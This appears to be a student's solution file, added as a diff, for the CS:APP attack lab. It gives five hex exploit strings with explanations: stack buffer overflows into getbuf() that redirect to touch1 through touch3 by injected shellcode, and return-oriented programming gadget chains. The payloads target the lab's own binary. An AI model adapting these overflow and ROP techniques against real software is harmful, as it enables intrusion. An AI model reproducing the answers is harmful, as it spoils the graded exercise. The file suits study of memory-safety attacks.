@@ -1,0 +1,115 @@
+1. 
+
+([0-9a-f]{2}\s){40}c0 17 40 00 00 00 00
+
+Function getbuf() allocates 40 bytes on stack and pass pointer to rsp to function Gets(). 
+So the buffer starts at $rsp and the return address from getbuf() is at $rsp + 40.
+The exploit string should consist of 40 arbitrary symbols followed by address of function 
+touch1() which is 0x4017c0 as we see in disassembled program.
+
+2. 
+
+bf fa 97 b9 59 68 ec 17 40 00 c3 ([0-9a-f]{2}\s){29} 78 dc 61 55 00 00 00
+
+As in previous solution we have to store return address at $rsp + 40. But this time
+it should be an address of our injected code which we'll place at the beginning of the buffer.
+Function touch2() takes an int argument which should be at $rdi.
+So our code should mov cookie value to $rdi and goto touch2.
+Here is the code doing that (file exploit2code.s):
+
+    mov $0x59b997fa, %edi   # store cookie as argument for touch2
+    push $0x4017ec          # push the address of touch2
+    retq                    # this should jmp to touch2
+
+Command gcc -c exploit2code.s and then objdump -d exploit2code.o 
+gives us byte representaion of that code.
+
+    #  0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
+    #  5:   68 ec 17 40 00          pushq  $0x4017ec
+    #  a:   c3                      retq 
+
+So the exploit string starts with that sequence of bytes followed by 29 arbitrary hex values and 
+ends up with address of the begining of the buffer.
+
+3. 
+
+48 c7 c7 a8 dc 61 55 68 
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+
+As in previous we have a buffer of 40 bytes and store return address to touch3() next to the buffer end.
+In these case when touch3() and then hexmatch() functions are called they do several push operations
+and rewrite our exploit string. So, we have to store cookie string at the end of input string after return address.
+
+Cookie string: 35 39 62 39 39 37 66 61
+Injected code:
+    mov  $0x5561dca8, %rdi         # store address of cookie string in %rdi for touch3()
+    push $0x4018fa                 # push the address of touch3        
+    retq                           # it should jmp to touch3
+
+gcc -c gcc -c exploit3code.s and then objdump -d exploit3code.o give byte sequence of instructions:
+
+    0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
+    7:   68 fa 18 40 00          pushq  $0x4018fa
+    c:   c3                      retq  
+
+When enter getbuf() the $rsp value is 0x5561dca0. So the address of injected code will be 0x5561dca0 - 40 = 0x5561dc78,
+and the address of cookie string is $rsp + 8. Combining all together we get final exploit string.
+
+4.
+
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+cc 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+
+Here is an illustration of how input string get placed on stack after buffer overflow:
+
+|-----------------------| <-- %rsp after do movq %rax, %rdi and ret from addval_273() to touch2()
+| addr <touch2>         |
+|-----------------------| <-- %rsp after ret from getval_280() to addval_273()
+| addr <addval_273> + 2 |
+|-----------------------| <-- %rsp after popq %rax 
+|      cookie value     |
+|-----------------------| <-- %rsp after ret from getbuf()
+| addr <getval_280> + 2 | 
+|-----------------------| <-- %rsp before ret from getbuf() (buf + 40 bytes)
+|                       |
+|          ...          |
+|                       |
+|-----------------------| <-- buf start (beginning of input string)
+
+5. 
+
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+
+ad 1a 40 00 00 00 00 00 /* setval_350+2 (48 89 e0) movq %rsp, %rax */
+a2 19 40 00 00 00 00 00 /* addval_273+2 (48 89 c7) movq %rax, %rdi */
+d6 19 40 00 00 00 00 00 /* add_xy (48 8d 04 37) lea (%rdi,%rsi,1),%rax */
+a2 19 40 00 00 00 00 00 /* addval_273+2 (48 89 c7) movq %rax, %rdi */ 
+
+0e 1a 40 00 00 00 00 00 /* setval_276+4 (08 c9) orb %cl,%cl */
+fa 18 40 00 00 00 00 00 /* touch3 */
+00 00 00 00 00 00 00 00
+35 39 62 39 39 37 66 61 /* cookie string */
+00 00 00 00 00 00 00 00
+
+As in previous solution we place our data after first 40 bytes of input string.
+When we return from getbuf() the %rcx register always stores 0x30 (48). So our task is
+move address %rsp + %rcx to %rdi before jump to touch3() and place cookie string at appropriate 
+position in the input string. Next 32 bytes do that with several return instructions.
+Next we place instruction orb %cl,%cl (equivalent of nop). We need if for avoiding segfault.
+With next return we jump to touch3() with correct address of cookie string in %rdi as argument.
